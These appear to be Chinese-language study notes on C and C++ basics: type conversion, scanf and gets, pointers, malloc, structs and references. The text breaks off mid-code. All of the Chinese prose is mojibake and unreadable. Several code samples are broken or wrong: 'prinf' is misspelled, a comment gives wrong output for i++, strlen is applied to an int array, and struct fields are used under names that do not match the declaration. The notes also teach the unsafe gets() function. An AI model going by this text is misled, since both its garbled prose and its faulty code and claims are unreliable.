è¯­è¨€ä¸­ï¼Œé€šè¿‡å–åœ°å€ç¬¦(&amp;) å³å¯çœ‹è§å˜é‡åœ¨å†…å­˜æ‰€å ç©ºé—´å¤§å°ã€‚ C è¯­è¨€ä¸­çš„æ•°æ®ç±»å‹ï¼š å­—ç¬¦å‹å¸¸é‡ï¼šç”¨å•å¼•å·æ‹¬èµ·æ¥çš„ä¸€ä¸ªå­—ç¬¦ï¼Œå¦‚æœç”¨åŒå¼•å·æˆ–è€…å•å¼•å·å†…æœ‰N ä¸ªå­—ç¬¦ï¼Œåˆ™éƒ½ä¸æ˜¯å­—ç¬¦å‹å¸¸é‡ã€‚ å­—ç¬¦ä¸²å¸¸é‡ï¼šç”¨åŒå¼•å·æ‹¬èµ·æ¥çš„å­—ç¬¦åºåˆ— åœ¨C è¯­è¨€ä¸­ï¼Œå¹¶æ²¡æœ‰å¯¹åº”çš„å­—ç¬¦ä¸²å˜é‡ï¼Œä¸ä¼šåƒPHP è¯­è¨€ä¸“é—¨æœ‰ä¸€ä¸ªString ç±»å‹æ¥å­˜å‚¨å¯¹åº”çš„å­—ç¬¦å˜é‡ã€‚ é‚£ä¹ˆè¯¥å¦‚ä½•å­˜å‚¨å­—ç¬¦ä¸²å‘¢ï¼Ÿåœ¨C è¯­è¨€ä¸­ï¼Œæ˜¯é€šè¿‡å­—ç¬¦æ•°ç»„æ¥å­˜å‚¨å­—ç¬¦ä¸²çš„ã€‚ å­—ç¬¦ä¸²æ˜¯ç”±å­—ç¬¦ç»„æˆçš„ï¼Œå¯¹äºè®¡ç®—æœºè€Œè¨€ï¼Œå­—ç¬¦ä¸²æ˜¯ç”±ä¸€ä¸ªä¸ªå­—ç¬¦ç»„æˆçš„ï¼Œè€Œä¸€ä¸ªå­—ç¬¦çš„å¤§å°æ˜¯ä¸€ä¸ªå­—èŠ‚ã€‚China è¿™ä¸ªå­—ç¬¦ä¸²åœ¨è®¡ç®—æœºä¸­ï¼Œæ‰€å çš„å¤§å°æ˜¯å…­ä¸ªå­—èŠ‚è€Œä¸æ˜¯äº”ä¸ªï¼Œè¿™æ˜¯å› ä¸ºæœ€åä¸€ä¸ªå­—ç¬¦æ˜¯ç”±\\0 ç»“å°¾ï¼Œä¹Ÿéœ€è¦å ç”¨ä¸€ä¸ªå­—èŠ‚ã€‚ ç±»å‹è½¬æ¢C è¯­è¨€åœ¨åšæ··åˆè¿ç®—æ—¶ï¼Œå› ä¸ºæ˜¯å¼ºç±»å‹çš„è¯­è¨€ï¼Œå½“åšç®—æœ¯è¿ç®—æ—¶ï¼ŒC è¯­è¨€ä¼šæŒ‰ç…§å˜é‡çš„æ•°æ®ç±»å‹å»è¿›è¡Œè¿ç®—ã€‚ åœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œå¦‚æœç›´æ¥è¿›è¡Œè¿ç®—ï¼Œå¾—åˆ°çš„ç»“æœå¹¶ä¸æ˜¯æˆ‘ä»¬æ‰€æœŸæœ›çš„ï¼š 123456int main&#123; int i = 5; float f = i / 2; printf(\"%f \\n\", f); // 2.0000&#125; æ‰€ä»¥ä¸ºäº†èƒ½æ­£å¸¸è¾“å‡º 2.5ï¼Œéœ€è¦å°†è¿™ä¸ªè¡¨è¾¾å¼ç»™è½¬æ¢ä¸ºä¸ºæµ®ç‚¹å‹ã€‚ 123456int main&#123; int i = 5; float f = (float)i / 2; printf(\"%f \\n\", f); // 2.5&#125; å†æ¥çœ‹å¦å¤–ä¸€ä¸ªä¾‹å­ï¼š 12345678910#include &lt;stdio.h&gt;int main(int argc, char const *argv[])&#123; double a = 3.33; int i = a / 1.11; printf(\"%d \\n\", i); // 2 return 0;&#125; ä¸ºä»€ä¹ˆå¾—åˆ°çš„ç»“æœä¸æ˜¯ 3 ï¼Œè€Œæ˜¯ 2ï¼Ÿ è¿™æ˜¯å› ä¸ºC è¯­è¨€ï¼Œå¯¹äºæ²¡æœ‰å£°æ˜ä¸ºå˜é‡çš„æµ®ç‚¹å‹ä¼šé»˜è®¤è½¬æ¢ä¸º double åŒç²¾åº¦ç±»å‹ï¼š è€Œå¦‚æœå¦ä¸€ä¸ªå˜é‡çš„å¹¶ä¸æ˜¯æµ®ç‚¹ç±»å‹ï¼Œæ¯”å¦‚æ˜¯ float ç±»å‹ï¼Œæ­¤æ—¶è¿™ä¸¤ä¸ªç²¾åº¦ä¸ä¸€æ ·çš„æµ®ç‚¹æ•°ç›´æ¥è¿›è¡Œè¿ç®—å°±ä¼šä¸¢å¤±ç²¾åº¦ã€‚ æ‰€ä»¥å‘¢ï¼Œåœ¨C è¯­è¨€ä¸­è¿›è¡Œç®—æœ¯è¿ç®—æ—¶ï¼Œéœ€è¦ä¿è¯æ•°æ®ç±»å‹åœ¨é¢„æœŸå†…ã€‚å¯¹äºä¸Šé¢çš„é—®é¢˜ï¼Œæœ‰ä¸¤ç§æ–¹æ¡ˆï¼š å°†å˜é‡a è½¬æ¢ä¸º double ç±»å‹ å°† 1.11 å¼ºåˆ¶è½¬æ¢ä¸º float ç±»å‹ è¿ç®—ç¬¦ä¸è¡¨è¾¾å¼è¿ç®—ç¬¦çš„ç§ç±»ï¼š ç®—æœ¯è¿ç®—ç¬¦ å…³ç³»è¿ç®—ç¬¦ é€»è¾‘è¿ç®—ç¬¦ ä½è¿ç®—ç¬¦ èµ‹å€¼è¿ç®—ç¬¦ æ¡ä»¶è¿ç®—ç¬¦ é€—å·è¿ç®—ç¬¦ æŒ‡é’ˆè¿ç®—ç¬¦ æ±‚å­—èŠ‚æ•°è¿ç®—ç¬¦ å¼ºåˆ¶ç±»å‹è½¬æ¢è¿ç®—ç¬¦ åˆ†é‡è¿ç®—ç¬¦ ä¸‹æ ‡è¿ç®—ç¬¦ å…¶ä»–ï¼ˆå¦‚å‡½æ•°è°ƒç”¨è¿ç®—ç¬¦ï¼‰ i++ å’Œ ++i çš„åŒºåˆ«ï¼š i++ æ˜¯å…ˆè¿›è¡Œè¿ç®—ç¬¦ï¼Œæœ€åæ‰å¯¹å˜é‡ i è¿›è¡Œ+1 ++i åˆ™åˆšå¥½æ˜¯ç›¸åçš„ï¼Œå…ˆå¯¹å˜é‡ i è¿›è¡Œ +1ï¼Œç„¶åè¿›è¡Œå…¶ä»–è¿ç®— 1234567891011121314#include &lt;stdio.h&gt;int main(int argc, char const *argv[])&#123; int i = 1; int j = i ++ &lt; -1; prinf(\"i = %d, j = %d \\n\", i, j); // i = 0, j = 0 // int i = 1; // int j = ++i &lt; -1; // prinf(\"i = %d, j = %d \\n\", i, j); // i = 0, j = 1 return 0;&#125; C è¯­è¨€ä¸­æ²¡æœ‰å¸ƒå°”ç±»å‹ã€‚C è¯­è¨€è®¤ä¸ºä¸€åˆ‡éé›¶çš„å€¼éƒ½æ˜¯çœŸã€‚ ä¸‹é¢è¿™æ®µä»£ç è¿™æ ·å†™æ˜¯æœ‰é—®é¢˜çš„ï¼Œå› ä¸º char ç±»å‹æ‰€å ç©ºé—´å¤§å°æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œè€Œ scanf è·å–æ ‡å‡†è¾“å…¥çš„æ˜¯ä¸€ä¸ªæ•´å‹ï¼Œè€Œæ•´å‹æ‰€å ç©ºé—´å¤§å°åˆæ˜¯å››ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥è¿™æ®µä»£ç è¿è¡Œä¹‹åä¼šæŠ¥é”™ã€‚ 123456789#include &lt;stdio.h&gt;int main(int argc, char const *argv[])&#123; char c; scanf(\"%d\", &amp;c); prinf(\"c = %c \\n\", c); return 0;&#125; æ­£ç¡®çš„å®ä¾‹ï¼Œåº”è¯¥æ˜¯è¿™æ ·ï¼Œå®šä¹‰å˜é‡æ—¶ï¼Œä½¿ç”¨ int ç±»å‹å»å®šä¹‰ 123456789#include &lt;stdio.h&gt;int main(int argc, char const *argv[])&#123; int c; scanf(\"%d\", &amp;c); prinf(\"c = %c \\n\", c); return 0;&#125; è·å–è¾“å…¥ä¸è¾“å‡ºscanfæ•´å‹ã€æµ®ç‚¹å‹ã€å­—ç¬¦å‹éœ€è¦ä½¿ç”¨å–åœ°å€ç¬¦ã€‚ printfprintf å‡½æ•°ï¼š %dï¼šä»¥æ•´å‹è¾“å‡ºå¯¹åº”æ•°æ® %fï¼šä»¥æµ®ç‚¹å‹è¾“å‡ºå¯¹åº”æ•°æ® %cï¼šä»¥å­—ç¬¦å‹è¾“å‡ºå¯¹åº”æ•°æ® getså½“ä¸€æ¬¡è¯»å–ä¸€è¡Œå†…å®¹æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ gets 12char c[20];gets(c); ä½¿ç”¨ scanf è·å–æ ‡å‡†è¾“å…¥æ—¶ï¼Œä¼šé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œå½“è¾“å…¥çš„å­—ç¬¦ä¸­é—´å­˜åœ¨ç©ºæ ¼æ—¶ï¼Œä¼šç»“æŸåŒ¹é…ï¼Œè¿™æ ·å°±æ²¡æœ‰åŠæ³•æŠŠä¸€è¡Œå¸¦æœ‰ç©ºæ ¼çš„å­—ç¬¦ä¸²å­˜åˆ°ä¸€ä¸ªå­—ç¬¦æ•°ç»„ä¸­äº†ã€‚ gets çš„åŸç†ï¼šä¼šä»ç¼“å†²åŒºä¸­ä¸€ç›´è¿›è¡Œè¯»å–ï¼Œç›´åˆ°é‡åˆ° \\n ç»“æŸç¬¦ã€‚ è€Œ scanf åˆ™ä¼šåŒ¹é… \\n ç»“æŸç¬¦ä¹‹å‰çš„æ‰€æœ‰å†…å®¹ï¼Œä¹Ÿå°±æ˜¯å®ƒä¼šæŠŠ \\n ç»“æŸç¬¦ç•™åœ¨ç¼“å†²åŒºä¸­ã€‚æ‰€ä»¥å½“ scanf å’Œ gets å‡½æ•°ä¸€èµ·ä½¿ç”¨æ—¶ï¼Œéœ€è¦ä¸»åŠ¨å»æ‰ç»“æŸç¬¦ã€‚ 1234567891011121314151617181920#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main(int argc, char const *argv[])&#123; int i; // char c[20]; scanf(\"%d\", &amp;i); char *p = (char*)malloc(i); char c; scanf(\"%c\", &amp;c); gets(p); puts(p); free(p); p = NULL; return 0;&#125; å¦åˆ™ gets è·å–ä¸åˆ°æ ‡å‡†è¾“å…¥ã€‚ putsè¾“å‡ºå­—ç¬¦ä¸²ã€‚ 123puts()ã€// ç­‰ä»·äº print_f(\"%s \\n\", p); è¿™é‡Œçš„p è¦æ±‚æ˜¯ä¸€ä¸ªå­—ç¬¦æŒ‡é’ˆ// puts è®¿é—®çš„æ˜¯å­—ç¬¦æŒ‡é’ˆçš„åœ°å€ï¼Œç„¶åéå†å°†é‡Œé¢çš„å€¼ä¾æ¬¡ print å‡ºæ¥ æ•°ç»„C è¯­è¨€çš„æ•°ç»„ã€‚ ä½¿ç”¨C è¯­è¨€çš„æ•°ç»„æ—¶ï¼Œéœ€è¦æ³¨æ„å“ªäº›é—®é¢˜ï¼Ÿ æ•°ç»„è®¿é—®è¶Šç•Œçš„é—®é¢˜ C è¯­è¨€ä¼šå¯¹å­—ç¬¦ä¸²å¸¸é‡ï¼Œè‡ªåŠ¨å¢åŠ ä¸€ä¸ª\\0ï¼Œæ‰€ä»¥å½“ä½¿ç”¨æ•°ç»„å­˜åœ¨å­—ç¬¦ä¸²å¸¸é‡æ—¶ï¼Œéœ€è¦æ³¨æ„æ•°ç»„çš„ç´¢å¼•é•¿åº¦ å­—ç¬¦ä¸²ä¸ºä»€ä¹ˆéœ€è¦æœ‰ç»“æŸç¬¦ï¼Ÿå› ä¸ºéœ€è¦æœ‰ä¸€ä¸ªç»“æŸç¬¦ï¼Œèƒ½è®©C è¯­è¨€çŸ¥é“è¿™ä¸ªå­—ç¬¦åœ¨ä»€ä¹ˆä½ç½®ç»“æŸã€‚ åœ¨Mac ä¸‹ï¼Œæ•°ç»„ä¸€æ—¦è¶Šç•Œäº†ï¼Œç¼–è¯‘ä¼šè¿‡ä¸äº†ã€‚ C è¯­è¨€è§„å®šå­—ç¬¦ä¸²çš„ç»“æŸæ ‡è®°ä¸º \\0ï¼Œç³»ç»Ÿä¼šå¯¹å­—ç¬¦ä¸²å¸¸é‡è‡ªåŠ¨åŠ ä¸€ä¸ª \\0ï¼Œæ‰€ä»¥å­—ç¬¦æ•°ç»„å­˜å‚¨çš„å­—ç¬¦ä¸²é•¿åº¦å¿…é¡»æ¯”å­—ç¬¦æ•°ç»„å°‘ 1 å­—èŠ‚ã€‚ æ•´å‹æ•°ç»„åœ¨ä¼ é€’å®å‚æ—¶ï¼Œéœ€è¦ä¸€å¹¶æŠŠæ•°ç»„çš„é•¿åº¦ç»™ä¼ è¿‡å»ã€‚è€Œå­—ç¬¦æ•°ç»„åˆ™ä¸ç”¨ï¼Œ å‡½æ•°æ¯ä¸€ä¸ªå‡½æ•°åœ¨æ‰§è¡Œå®Œæˆä¹‹åï¼Œéƒ½ä¼šè¢«æ ˆç©ºé—´é‡Šæ”¾æ‰ã€‚ å‡½æ•°é—´çš„è°ƒç”¨å…³ç³»æ˜¯ï¼Œç”±ä¸»å‡½æ•°è°ƒç”¨å…¶ä»–å‡½æ•°ï¼Œå…¶ä»–å‡½æ•°ä¹‹é—´ä¹Ÿå¯ä»¥ç›¸äº’è°ƒç”¨ï¼ŒåŒä¸€ä¸ªå‡½æ•°å¯ä»¥è¢«ä¸€ä¸ªæˆ–è€…å¤šä¸ªå‡½æ•°è°ƒç”¨ N æ¬¡ã€‚ å‡½æ•°çš„å£°æ˜ä¸å®šä¹‰æ˜¯æœ‰åŒºåˆ«çš„ï¼š å‡½æ•°çš„å®šä¹‰æ˜¯æŒ‡å¯¹å‡½æ•°åŠŸèƒ½çš„ç¡®ç«‹ï¼ŒåŒ…æ‹¬æŒ‡å®šå‡½æ•°åã€å‡½æ•°å€¼ç±»å‹ã€å½¢å‚åŠå…¶ç±»å‹ã€å‡½æ•°ä½“ç­‰ï¼Œå®ƒæ˜¯ä¸€ä¸ªå®Œæ•´çš„ã€ç‹¬ç«‹çš„å‡½æ•°å•ä½ã€‚ å‡½æ•°çš„å£°æ˜çš„ä½œç”¨æ˜¯æŠŠå‡½æ•°çš„åå­—ã€å‡½æ•°ç±»å‹åŠå½¢å‚çš„ç±»å‹ã€ä¸ªæ•°å’Œé¡ºåºé€šçŸ¥ç¼–è¯‘ç³»ç»Ÿï¼Œä»¥ä¾¿åœ¨è°ƒè¯•è¯¥å‡½æ•°æ—¶ç¼–è¯‘ç³»ç»Ÿèƒ½æ­£ç¡®è¯†åˆ«å‡½æ•°å¹¶æ£€æŸ¥è°ƒç”¨æ˜¯å¦åˆæ³• C è¯­è¨€çš„å±€éƒ¨å˜é‡ã€å…¨å±€å˜é‡å’Œå…¶ä»–è¯­è¨€æ˜¯å¾ˆåƒçš„ï¼Œæ²¡æœ‰å¤ªå¤šéœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼Œåªæ˜¯åœ¨ C è¯­è¨€ä¸­å°½é‡ä¸è¦ä½¿ç”¨å…¨å±€å˜é‡ï¼Œç¨‹åºå®¹æ˜“å‡ºé”™ã€‚ è·å–å­—ç¬¦æ•°ç»„çš„ç´¢å¼•é•¿åº¦ä½¿ç”¨ sizeofï¼Œè·å–å­—ç¬¦æ•°ç»„çš„å­—ç¬¦é•¿åº¦ä½¿ç”¨ strlenã€‚ éå†ä¸€ä¸ªå­—ç¬¦æ•°ç»„æ—¶ï¼Œå°½ç®¡è¾“å‡ºçš„æ˜¯ 1ï¼Œä½†è¦æ˜ç¡®å®ƒæ˜¯ä¸€ä¸ªå­—ç¬¦ç±»å‹ï¼Œè€Œä¸æ˜¯æ•´å‹ã€‚æ‰€ä»¥åœ¨è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œéœ€è¦æ—¶åˆ»ä¿è¯ç­‰å¼ä¸¤è¾¹çš„æ•°æ®ç±»å‹æ˜¯ä¸€è‡´çš„ã€‚ 12345678#include &lt;stdio.h&gt;int main(int argc, char const *argv[])&#123; int ret[20]; printf(\"%d \\n\", sizeof(ret)); // 80 printf(\"%d \\n\", strlen(ret)); // 0 ç´¢å¼•é•¿åº¦&#125; åœ¨åš C è¯­è¨€å­—ç¬¦ä¸²æ‹¼æ¥ã€æ›¿æ¢ç›¸å…³çš„é¢˜ç›®æ—¶ï¼Œéœ€è¦æ³¨æ„ä½¿ç”¨ \\0 ä½œä¸ºç»“æŸç¬¦ã€‚ scanf ä¼šä»ç¼“å†²åŒºä¸­è¯»å–å¯¹åº”çš„å†…å®¹ï¼Œç›´è‡³é‡åˆ° \\n æ‰ä¼šåœæ­¢è¯»å–ï¼Œä¸ä¼šè¯»å– \\nã€‚è€Œ gets å‡½æ•°ä¹Ÿæ˜¯ä»ç¼“å†²åŒºé‡Œé¢è¯»å–ï¼Œé‡åˆ° \\n å°±ç»“æŸã€‚ æ‰€ä»¥ä½¿ç”¨å®Œ scanf ä¹‹åï¼Œå¦‚æœä¸ä¸»åŠ¨æ¶ˆé™¤ \\nï¼Œç›´æ¥ä½¿ç”¨ gets ä¼šå¯¼è‡´ç¨‹åºç›´æ¥å‘ä¸‹ç»§ç»­æ‰§è¡Œï¼Œå› ä¸º gets è¯»å–åˆ°çš„æ˜¯ç»“æŸç¬¦ \\nã€‚ æŒ‡é’ˆæŒ‡é’ˆçš„æœ¬è´¨å°±æ˜¯åœ°å€ã€‚ ä¸€ä¸ªå˜é‡åœ¨å†…å­˜ä¸­ï¼Œå¯ä»¥åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šç¼–å€ï¼ˆå˜é‡çš„åœ°å€ï¼‰å’Œå…·ä½“çš„å€¼ã€‚ å¦‚æœæƒ³æŠŠæŸä¸ªå˜é‡çš„åœ°å€ä¿å­˜ä¸‹æ¥ï¼Œå°±éœ€è¦ç”¨åˆ°æŒ‡é’ˆã€‚ &amp; æ˜¯å–åœ°å€ç¬¦å·ï¼Œä¹Ÿç§°ä¸ºå¼•ç”¨ï¼Œé€šè¿‡è¯¥æ“ä½œç¬¦å¯ä»¥è·å–ä¸€ä¸ªå˜é‡çš„åœ°å€å€¼ã€‚* æ˜¯å–å€¼æ“ä½œç¬¦ï¼Œä¹Ÿç§°ä¸ºè§£å¼•ç”¨ï¼Œé€šè¿‡è¿™ä¸ªæ“ä½œç¬¦å¯ä»¥è·å–ä¸€ä¸ªåœ°å€å¯¹åº”çš„æ•°æ®ã€‚ æŒ‡é’ˆçš„ä½¿ç”¨åœºæ™¯æ€»ç»“ä¸‹æ¥åªæœ‰ä¸¤ç§ï¼š ä¼ é€’ åç§» å‡½æ•°å…·æœ‰è‡ªå·±çš„å†…å­˜ç©ºé—´ï¼Œåœ¨æŸä¸ªå‡½æ•°ä¸­å®šä¹‰äº†ä¸€ä¸ªå˜é‡ä¹‹åï¼Œå°±ä¼šåœ¨è¿™ä¸ªå†…å­˜ä¸­å¼€è¾Ÿå¯¹åº”å¤§å°çš„å†…å­˜ç©ºé—´ã€‚å€¼ä¼ é€’æ˜¯ä¸ä¼šæ”¹å˜åŸå€¼çš„ã€‚ &amp; ç¬¦å·çš„ä½œç”¨æ˜¯è·å–å˜é‡çš„åœ°å€ï¼Œ* ç¬¦å·çš„ä½œç”¨æ˜¯é€šè¿‡å˜é‡çš„åœ°å€è·å–å¯¹åº”çš„å€¼ã€‚ 1234567891011#include &lt;stdio.h&gt;int main(int argc, char const *argv[])&#123; int i = 5; // å®šä¹‰ä¸€ä¸ªå˜é‡ i å€¼ä¸º 5 int* p = &amp;i; // å®šä¹‰ä¸€ä¸ªæ•´å‹æŒ‡é’ˆå˜é‡ï¼Œå€¼ä¸ºå˜é‡ i çš„åœ°å€ printf(\"i = %d \\n\", i); // ç›´æ¥è®¿é—® printf(\"*p = %d \\n\", *p); // é€šè¿‡å–å€¼æ“ä½œç¬¦é—´æ¥è®¿é—®å˜é‡ p return 0;&#125; å­—ç¬¦æ•°ç»„çš„æ•°ç»„åé‡Œå­˜çš„å°±æ˜¯å­—ç¬¦æ•°ç»„çš„èµ·å§‹åœ°å€ã€‚ç±»å‹æ˜¯å­—ç¬¦æŒ‡é’ˆã€‚ æ•°ç»„åçš„ç±»å‹æ˜¯æ•°ç»„ï¼Œé‡Œé¢å­˜äº†ä¸€ä¸ªå€¼ï¼Œå°±æ˜¯æ•°ç»„çš„èµ·å§‹åœ°å€ï¼Œ æŒ‡é’ˆçš„ä¼ é€’123456789101112131415161718#include &lt;stdio.h&gt;void change(int *j)&#123; *j = 10;&#125;int main(int argc, char const *argv[])&#123; int i = 5; printf(\"ä¿®æ”¹ä¹‹å‰i = %d \\n\", i); // 5 change(&amp;i); printf(\"ä¿®æ”¹ä¹‹åi = %d \\n\", i); // 10 return 0;&#125; æŒ‡é’ˆçš„åç§»1234567891011121314151617181920#include &lt;stdio.h&gt;int main(int argc, char const *argv[])&#123; int arr[5] = &#123;1, 2, 3, 4, 8&#125;; int* p; // å®šä¹‰ä¸€ä¸ªæ•´å‹æŒ‡é’ˆå˜é‡ p = arr; // å› ä¸ºæ•°ç»„çš„åç§°å°±æ˜¯æ•°ç»„çš„èµ·å§‹åœ°å€ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥æŠŠå¯¹åº”åœ°å€èµ‹å€¼ç»™æ•´å‹æŒ‡é’ˆ p printf(\"*p = %d \\n\", *p); // å¯¹ä¸€ä¸ªæŒ‡é’ˆå˜é‡è¿›è¡Œå–å€¼æ—¶ï¼ˆéœ€è¦å–å€¼æ“ä½œç¬¦ï¼‰ï¼Œå¾—åˆ°çš„æ˜¯å…¶åŸºç±»å‹ // æŒ‡é’ˆçš„åç§» for (int i = 0; i &lt; 5; i++) &#123; // å¯¹æŒ‡é’ˆè¿›è¡Œåç§»æ—¶ï¼Œæ¯æ¬¡çš„åç§»é‡æ˜¯å¯¹åº”çš„åŸºç±»å‹å¤§å° // æ¯”å¦‚è¿™é‡Œå¯¹æŒ‡é’ˆ p è¿›è¡Œåç§»ï¼ˆ+ 1ï¼‰ï¼Œå…¶å®å¯¹åº”çš„å†…å­˜ä¸­çš„ printf(\"%d \\n\", *(p + i)); &#125; return 0;&#125; æŒ‡é’ˆä¸ä¸€ç»´æ•°ç»„æ•°ç»„åœ¨ä¼ é€’æ—¶ä¼šå¼±åŒ–ä¸ºæŒ‡é’ˆï¼š 1234567891011121314151617181920#include &lt;stdio.h&gt;// è¿™ä¸¤ç§å†™æ³•æ˜¯ä¸€æ ·çš„// void change(char d[])// &#123;// printf(\"%c \\n\", *d); // h// &#125;void change(char *d)&#123; printf(\"%c \\n\", *d); // h&#125;int main(int argc, char const *argv[])&#123; char c[10] = \"hello\"; change(c); return 0;&#125; ä¸€ç»´æ•°ç»„åœ¨è¿›è¡Œå‡½æ•°è°ƒç”¨æ—¶ï¼Œä¸ºä»€ä¹ˆå®ƒçš„é•¿åº¦å­å‡½æ•°æ²¡æœ‰åŠæ³•çŸ¥é“ï¼Ÿè¿™æ˜¯å› ä¸ºä¸€ä½æ•°ç»„çš„æ•°ç»„åå­˜å‚¨çš„æ˜¯æ•°ç»„çš„é¦–åœ°å€ï¼ˆä¹Ÿå°±æ˜¯ç´¢å¼•ä¸ºé›¶çš„å€¼çš„åœ°å€ï¼‰ï¼Œå‹æ ¹å°±ä¸æ˜¯æ•°ç»„ï¼Œæ‰€ä»¥æ²¡æœ‰åŠæ³•ç›´æ¥çŸ¥é“å¯¹åº”é•¿åº¦ã€‚ 12345678910void change(char *d)&#123; *d = 'H'; // ç­‰ä»·äº // d[0] = 'H'; // è¿™ä¸¤ç§æ–¹å¼éƒ½å¯ä»¥æ”¹å˜æ•°ç»„å†…çš„å€¼ï¼Œä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œèµ‹å€¼è¡¨è¾¾å¼ä¸¤è¾¹çš„ç±»å‹éœ€è¦ä¿æŒä¸€è‡´ // d[1] = 'E'; // *(d+1) = 'E'; printf(\"%c \\n\", *d); // h&#125; ä¸ºä»€ä¹ˆåœ¨å­å‡½æ•°å†…éƒ¨å¯ä»¥å¯¹æ•°ç»„è¿›è¡Œè®¿é—®å’Œä¿®æ”¹ï¼Ÿè¿™é‡Œå…¶å®ç”¨åˆ°äº†æŒ‡é’ˆçš„ä¼ é€’ä¸åç§»ã€‚ æŒ‡é’ˆä¸åŠ¨æ€ç”³è¯·å†…å­˜æ•°ç»„ä¸€å¼€å§‹å®šä¹‰å¥½å°±ç¡®å®šä¸‹æ¥äº†ï¼Œæ•°ç»„æ˜¯æ”¾åœ¨æ ˆç©ºé—´çš„ã€‚ æ ˆç©ºé—´çš„å¤§å°åœ¨ç¼–è¯‘æ—¶æ˜¯ç¡®å®šçš„ï¼Œå¦‚æœä½¿ç”¨å¤§å°ä¸ç¡®å®šï¼Œé‚£ä¹ˆå°±è¦ä½¿ç”¨å †ç©ºé—´ã€‚ ç”³è¯·å †ç©ºé—´ï¼Œä¼šæŠŠä¸€ä¸ªè¿ç»­çš„ N ä¸ªå­—èŠ‚çš„ç©ºé—´ç»™ä½ ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªèµ·å§‹åœ°å€ã€‚malloc ç”³è¯·ç©ºé—´çš„å•ä½æ˜¯å­—èŠ‚ã€‚ 12345678910#include &lt;stdio.h&gt;int main(int argc, char const *argv[])&#123; char *p1; int *p2; p1 = (char*)malloc(20); // p1 æœ€å¤šå¯ä»¥å­˜å‚¨ 19 ä¸ªå­—ç¬¦ p2 = (int*)malloc(20); // p2 æœ€å¤šå¯ä»¥å­˜åœ¨ 5 ä¸ªæ•´å‹æ•° return 0;&#125; é‡æŒ‡é’ˆæ˜¯ä»€ä¹ˆï¼Ÿ å½“ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘ä¸€å—ç©ºé—´ï¼Œè€Œè¿™ä¸ªç©ºé—´åˆä¸å±äºå®ƒï¼Œè¿™å°±æ˜¯é‡æŒ‡é’ˆã€‚ ç»“æ„ä½“ä½¿ç”¨ç»“æ„ä½“ä¹‹å‰ï¼Œéœ€è¦å…ˆå£°æ˜ï¼š 123456struct student&#123; int num; char name[20]; int age;&#125;; å®šä¹‰ä¸€ä¸ªç»“æ„ä½“å˜é‡ï¼š 1struct student student1 = &#123;1001, \"boo\", 23&#125;; å®šä¹‰ä¸€ä¸ªç»“æ„ä½“æ•°ç»„å˜é‡ï¼š 123struct student sarr[3] = &#123; 1001, \"boo\", 23,&#125;; . æ“ä½œç¬¦ç”¨æ¥è®¿é—®ç»“æ„ä½“å˜é‡ï¼Œ-&gt; æ“ä½œç¬¦ç”¨æ¥è®¿é—®æŒ‡é’ˆçš„æˆå‘˜ã€‚ ç»“æ„ä½“æŒ‡é’ˆç»“æ„ä½“æŒ‡é’ˆå°±æ˜¯ç»“æ„ä½“å˜é‡æ‰€å æ®çš„å†…å­˜æ®µçš„èµ·å§‹åœ°å€ã€‚ 1234567891011121314#include &lt;stdio.h&gt;int main(int argc, char const *argv[])&#123; // å®šä¹‰ä¸€ä¸ªç»“æ„ä½“ struct student student1 = &#123;1002, \"boo\", 23&#125;; // å®šä¹‰ä¸€ä¸ªç»“æ„ä½“æŒ‡é’ˆ struct student * p; p = &amp;student1; // è®¿é—®ç»“æ„ä½“æŒ‡é’ˆ printf(\"%d %s %d \\n\", p-&gt;id, p-&gt;name, p-&gt;age); // é€šè¿‡æŒ‡é’ˆçš„æˆå‘˜é€‰æ‹©è¿›è¡Œè®¿é—® printf(\"%d %s %d \\n\", (*p).id, (*p).name, (*p).age); // é€šè¿‡æŒ‡é’ˆå¯¹è±¡çš„æˆå‘˜è¿›è¡Œè®¿é—®&#125; typedefæ¯”å¦‚å¦‚æœéœ€è¦å®šä¹‰ä¸€ä¸ªç»“æ„ä½“å˜é‡ï¼Œæ¯æ¬¡éƒ½éœ€è¦å†™ä¸€ä¸ª struct xxxï¼Œè¿™ä¸ªæ˜¾ç„¶æ˜¯å¾ˆéº»çƒ¦çš„äº‹æƒ…ã€‚ typedef å…³é”®å­—çš„ä½œç”¨å°±æ˜¯å£°æ˜æ–°çš„ç±»å‹åæ¥ä»£æ›¿å·²æœ‰çš„ç±»å‹åã€‚ 123456789101112#include &lt;stdio.h&gt;// å£°æ˜ä¸€ä¸ªç»“æ„ä½“ï¼Œé¡ºå¸¦å®šä¹‰ä¸€ä¸ªåˆ«åtypedef struct student&#123; int id; char name[20]; int age;&#125; stu,* pstu;// stu ç­‰ä»·äº struct student// * pstu ç­‰ä»·äº struct student * C++å¼•ç”¨C++ çš„å¼•ç”¨å…¶å®å°±æ˜¯åœ¨å­å‡½æ•°ä¸­æ”¹å˜ä¸»å‡½æ•°çš„æŸä¸ªå˜é‡çš„å€¼ã€‚C ä¹Ÿå¯ä»¥åšåˆ°ï¼Œåªä¸è¿‡ç›¸æ¯”èµ·æ¥ C++ çš„å†™æ³•æ›´ç®€æ´ä¸€äº›ã€‚ 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;// ä¿®æ”¹æ•´å‹void modify_num(int &amp;i)&#123; i = 5;&#125;// ä¿®æ”¹æŒ‡é’ˆvoid modify_pointer(int *&amp;p)&#123; p = (int*)malloc(100); // ä¸ºä»€ä¹ˆè¿™é‡Œå¯ä»¥ç›´æ¥ç»™ p[0] èµ‹å€¼ï¼Ÿå› ä¸ºä½¿ç”¨ malloc ç”³è¯·çš„æ˜¯ä¸€å—è¿ç»­çš„ç©ºé—´ï¼Œè¿”å›çš„æ˜¯è¿™å—ç©ºé—´çš„é¦–åœ°å€ã€‚ // p[0] = 9; *p = 9; // æŒ‡é’ˆçš„ä¼ é€’ *(p+1) = 2; // 